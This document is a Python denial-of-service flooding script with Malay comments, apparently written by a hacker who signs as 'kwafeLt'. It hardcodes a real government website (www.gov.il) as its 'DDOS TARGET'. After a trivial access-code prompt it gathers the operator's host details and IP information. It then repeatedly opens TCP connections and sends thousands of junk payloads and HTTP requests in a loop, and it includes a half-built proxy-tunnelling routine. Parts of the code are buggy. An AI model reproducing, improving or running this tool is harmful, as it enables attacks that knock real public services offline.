#!/usr/bin/env python3
#
import hashlib, json, os, socket, sys, time, uuid
from requests import get
# from math import pi

# disable traceback printing
# sys.tracebacklimit = 0

banner = """

       ██   ██ ███    ██ ███    ██ ███████ ███████ ███████  █████     
    ██ ██   ██ ████   ██ ████   ██ ██      ██      ██      ██   ██ ██ 
       ███████ ██ ██  ██ ██ ██  ██ ███████ █████   █████   ███████    
    ██ ██   ██ ██  ██ ██ ██  ██ ██      ██ ██      ██      ██   ██ ▄█ 
       ██   ██ ██   ████ ██   ████ ███████ ██      ███████ ██   ██ ▀  

\r\n\t\t\tPERJALANAN DUNIA MENUJU ABADI\r\n
"""
workst = os.uname()[0] # workstation
hostnm = os.uname()[1] # hostname
platfm = os.uname()[2] # platform
usernm = os.environ.get('USERNAME') # admin / username
logger = str(os.getlogin()).replace('K', 'k').replace('l', 'L')
MAC_hx = hex(uuid.getnode())

bb = ['bypass','30011','admin']
cc = ['hnnsfea-s-comrade; written by kwafeLt','10v3{5h371x1}'] # terminal-title
sw = ['LOCKED OUT OF SERVER; kwafeLt wAS hERE..','https://lissascafe.github.io/?stt=raw','written by kwafeLt']
ua = ['Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0','']
co = ['HTTP/1.0','HTTP/1.1','HTTP/2']
pb = ['httpbin.org:443'] # blacksheep / honeypot

confrm = ['Do you want to continue ?','Is this ok ?']

cproxy = ('190.61.88.147', 8080) # replace with your proxy's IP address and port number
addrss = ('www.gov.il', 443) # DDOS TARGET
server = (socket.gethostbyname(addrss[0]),addrss[1]) # RECONS
servnm = addrss[0]

 # DORMAN: hanya untuk kegunaan ketika proses DEBUG
target_host_DEBUG = ['192.168.10.22']
target_port_DEBUG = [22,80,443,5500]
# PAUSE

# BASIC SETTING
def color(r, g, b, text): return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r, g, b, text)
# sebab saya tak nak guna modul colorama, jadi saya guna function ni sebagai alternatif; tapi leceh sikit la..
def write(cdata): return sys.stdout.write(cdata) # saya gunakan sys.stdout.write() bagi menggantikan print()
#
def os_sys(c):
  if (workst == "windows"):
    c = str(c).replace("clear","cls")
  else: pass
  return os.system(c)
# PAUSE

# CONSTR
script = sys.argv[0]
target_host = None
target_port = None
delay = 0.0
# PAUSE

def binary(data):
  # define the text to convert
  charac = str(data)
  # convert each character to binary and concatenate the results
  return ''.join(format(ord(c), '08b') for c in charac) # return binary

####################################################################################################

def closed(init):
  if (init == 0):
    write(f'\r {color(255,196,196,"CTRL-C PRESSED / KEYBOARD INTERRUPT RECEIVED, EXITING..   ")}\r\n')
  os_sys('setterm --foreground default --background default --cursor on')
  write(f"\r STOPPED: python3 {sys.argv[0]} {target_host} {target_port}\r\n")
  sys.exit(1)

def ctime0(data):
  ctime_tuple = time.localtime() # get struct_time
  time_string = time.strftime("%y/%m/%d %H:%M:%S", ctime_tuple)
  return str(time_string) # return datetime

def ctime1(data):
  # get the current Unix timestamp in seconds
  return str(time.time()) # return timestamp

def hashlb(data):
  str2hash = str(data).replace(".","")
  result = hashlib.md5(str2hash.encode())
  return result.hexdigest()

# FUNCTION / MINI-EMBED / casual-const..
# function untuk scan detail IP
def ipinfo(init):
  URL = ['http://ip-api.com/json/', f'http://ip-api.com/json/{target_host}'];  # EDT https://ipinfo.io/json/1.1.1.1
  response = get(URL[init]) # ORIG: requests.get(str)
  txt = json.loads(response.text)
  if (txt['status'] == 'success'):
    tx1 = f"{color(245, 245, 245, txt['country'])} {color(227, 10, 92, txt['regionName'])} {color(0, 110, 210, txt['city'])} {color(245, 245, 245, txt['zip'])}";
    tx2 = f"\r\n {color(227, 10, 92, txt['isp'])}\n {color(0, 110, 210, txt['query'])}"
    return tx1 + tx2
  else:
    return f"{color(245, 245, 245, txt['query'])} {color(0, 110, 210, txt['message'])}"
# PAUSE

# FUNCTION / START (PRIMARY)
#
def phase1(init):
  global target_host
  global target_port
  if (len(sys.argv) == 3):
    #
    HOST = str(sys.argv[1]).split("//")[-1].split("/")[0]   # DEBUG USER INPUT
    FQDN = socket.getfqdn(HOST)                             # TUKAR HOSTNAME KEPADA FQDN
    ADDR = socket.getaddrinfo(FQDN, sys.argv[2])[0][4][0]   # TUKAR FQDN KEPADA IP ADDRESS
    #
    target_host = str(socket.gethostbyname(FQDN))           # set semula host berdasarkan input user
    target_port = int(sys.argv[2])                          # set semula port berdasarkan input user
    phase2(init)
  else:
    write(f'\r\n Usage: {sys.argv[0]} <target_host> <target_port>')
    write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 443\n')
    # rpeset(init); sys.exit(init)

def phase2(init): # verify samada target online atau tak wujud dalam talian
  try:
    p1 = socket.gethostbyname(target_host)
    p2 = socket.create_connection((p1, target_port), 2)
    phase3(init)
    return False
  except socket.error:
    write(f'\r\n {color(245,45,45,"SYSTEM LOCKDOWN / SERVER OFFLINE / CLOSED PORT / FILTERED")}\r\n')
    closed(1)
  finally: pass

def phase3(init):
  os_sys('setterm --foreground cyan --background black --cursor on') # SET semula UI terminal (part-1)
  os_sys('clear') # kosongkan terminal
  terminal_title = cc[0] # lihat variable: cc
  print(f'\33]0;{terminal_title}\a', end = "", flush = True) # SET semula terminal_title
  write(f'{color(227,11,93,banner)}') # paparkan banner
  credit = f'\r\n\t{sw[0]}\n\n\t{sw[1]}\n\n\t{cc[0]}\n'
  write(f'{color(245,245,245,credit)}') # i
  phase4('access code')

def phase4(init):
  try:
    user_input = input(f"\r\n\t{color(248,152,128,init)}  :  ")
    if not user_input:
      phase4('  try again')
    else:
      phase5(user_input)
    return False
  except KeyboardInterrupt:
    closed(0)

def phase5(init):
  reply = init
  if (reply == bb[0]) or (reply == bb[1]) or (reply == bb[2]): # sila lihat variable bb
    phase6(init)
  else:
    phase4('  try again')
  return False

def phase6(init): # paparkan informasi sistem yg digunakan oleh user
  os_sys('setterm --foreground white --background black --cursor on') # SET semula UI terminal (part-2)
  os_sys('clear') # kosongkan terminal
  # hanya untuk tujuan kosmetik; jangan risau, tiada backdoor atau webhook.
  tx1 = color(242,210,189, logger) # variable LINE 18
  tx2 = color(192,192,192, hostnm) # variable LINE 15
  tx3 = color(242,210,189, MAC_hx) # variable LINE 19
  tx4 = color(192,192,192, workst) # variable LINE 14
  tx5 = color(242,210,189, platfm) # variable LINE 16
  write(f'\r\n {tx1} {tx2} {tx3} {tx4} {tx5}\r\n')
  #
  # Paparkan maklumat IP address user dan informasi IP address target.
  # OUTPUT: call dari function sebelumnya / sila RUJUK LINE 115
  #
  write(f'\r\n {ipinfo(0)}\r\n') # IP address USER
  #
  txt = f'wanna/will inject process to {target_host} : {target_port}'
  write(f'\r\n {color(248,152,128,txt)}\r\n')
  #
  write(f'\r\n {ipinfo(1)}\r\n') # IP address TARGET
  #
  yes_or_no(confrm[0]) # CONFIRM..?
#
# RETURN CONFIRM..!

def yes_or_no(question):
  reply = input(f'\r\n {color(248,152,128, question)} [y/N] ')
  if (reply == "") or (reply[0] == "y"):
    os_sys('setterm --background black --cursor off') # SET semula UI terminal (part-3)
    os_sys('clear')
    terminal_title = f'Injecting process \ {target_host}:{target_port}'
    print(f'\33]0;{terminal_title}\a', end = "", flush = True) # SET semula terminal_title
    write(f'\r {color(245,215,0,ctime0(0))} {color(255,228,225,"Initial")} {color(245,215,0,"Injecting process..")}\r')
    procss(0) # RUN SCRIPT
  if (reply[0] == "n"):
    closed(0)
    return False
  else: return yes_or_no('so.. YES or NO ?')

################################################################################
################################################################################
###################################### UNDER CONSTRUCTION ######################
def cproxy(proxy_address):
  # Create a socket connection to the proxy
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_sock:
    proxy_sock.settimeout(13.0)
    proxy_sock.connect(proxy_address)
    # Send a CONNECT request to the remote server through the proxy
    connect_request = 'CONNECT {}:{} HTTP/1.1\r\nHost: {}\r\n\r\n'.format(server_address[0], server_address[1], server_address[0]).encode()
    status = proxy_sock.sendall(connect_request)
    if status is None:
      print('PROXY CONNECTED')
      request = 'GET / HTTP/1.1\r\nHost: {}\r\n\r\n'
      proxy_sock.sendto((request).encode('ascii'), server_address)
      print('success')
    else:
      pass
    # Send a request to the remote server through the proxy
    request = 'GET / HTTP/1.1\r\nHost: {}\r\n\r\n'.format(server_address[0]).encode('ascii')
    proxy_sock.sendall(request)
    
    # Close the socket connection to the proxy
    proxy_sock.close()
############################################################## PAUSE ###########
################################################################################
################################################################################

def attack(data):
  static = hashlb(str(f'{ctime1(0)}').replace(".",""))
  string = ''.join(format(ord(blob), '08b') for blob in static) # convert each character to binary and concatenate the results
  stream = string.encode('cp1252') # convert the string to bytes using cp1252 encoding
  #
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as bulk:
    try:
      bulk.settimeout(3.0)
      bulk.connect(server)
      for i in range(4096):
        status = bulk.sendall(stream)
        stamp4 = hashlb(ctime1(0))
        if status is None: # check the status of the socket
          write(f'\r\n {color(196,196,255,ctime0(0))} {color(255,228,225,"Success")} {color(196,196,255,stamp4)}\r')
        else: # add a break statement to stop after 4096 iterations
          write(f'\r\n {color(245,245,245,"ERROR:")} {color(245,245,245,status)}\n {color(245,245,245,"SYSTEM LOCKDOWN / SERVER OFFLINE")}\r\n')
          close(0)
        time.sleep(0.003)
      bulk.close()
      procss(0)
    except socket.timeout:
      time.sleep(0.5)
      procss(2)
    except Exception as er:
      write(f'\r\n {color(245,245,245,"ERROR:")} {color(245,245,245,er)}\n {color(245,245,245,"SYSTEM LOCKDOWN / SERVER OFFLINE")}\n {color(245,245,245,"END of LINE..")}\r\n')
    except KeyboardInterrupt:
      closed(0)
    finally:
      while (bulk == True):
        bulk.close()

def recons(data):
  #
  cookie = hashlb(f'{ctime1(0)}')
  # create a TCP/IP socket
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
    # connect the socket to a remote server
    try:
      # server = (target_host, target_port)
      proc.settimeout(2.5)
      proc.connect(server)
      # send some bytes over the socket || HTTP/1.1 request
      bytes1 = f'GET /?!{cookie} {co[1]}\r\nHost: {servnm}\r\nAccept: */*\r\nUser-Agent: {ua}\r\n\r\n'
      proc.sendto((bytes1).encode('ascii'), server)
      #
      string = ''.join(format(ord(blob), '08b') for blob in cookie) # convert each character to binary and concatenate the results
      stream = string.encode('cp1252') # convert the string to bytes using cp1252 encoding
      status = proc.sendall(stream)
      # check the status of the socket
      if status is None: # ORIG: 'All bytes were sent successfully'
        write(f'\r\n {color(255,228,225,ctime0(0))} {color(196,196,255,"Success")} {color(255,196,196,cookie)}\r')
        # response = len(proc.recv(4096))
      else: # response = len(proc.recv(4096))
        print(f'ERROR: {status}'); close(0)
      # close the socket
      proc.shutdown(socket.SHUT_RDWR)
      proc.close()
    except socket.timeout:
      write(f'\r\n {color(245,45,45,ctime0(0))} {color(128,128,0,"Timeout")} {color(245,45,45,"...ERR_CONNECTION_TIMEOUT_ERR...")} {color(128,128,0,"RE-CONNECTING..")}\r')
      time.sleep(0.5)
    except socket.error:
      write(f'\r\n {color(227,11,93,ctime0(0))} {color(245,245,245,"Failure")} {color(227,11,93,"No connection SERVER MAY BE DOWN")}\r')
      time.sleep(2.0)
    except KeyboardInterrupt:
      closed(0)
    finally:
      while (proc == True):
        bulk.close()

def procss(count):
  while (count < 11):
    count = count + 1
    recons(count)
    if (count == 10):
      attack(count)
      count = 0
      break
    else: pass
  return
# COMMAND START
phase1(0)
# END
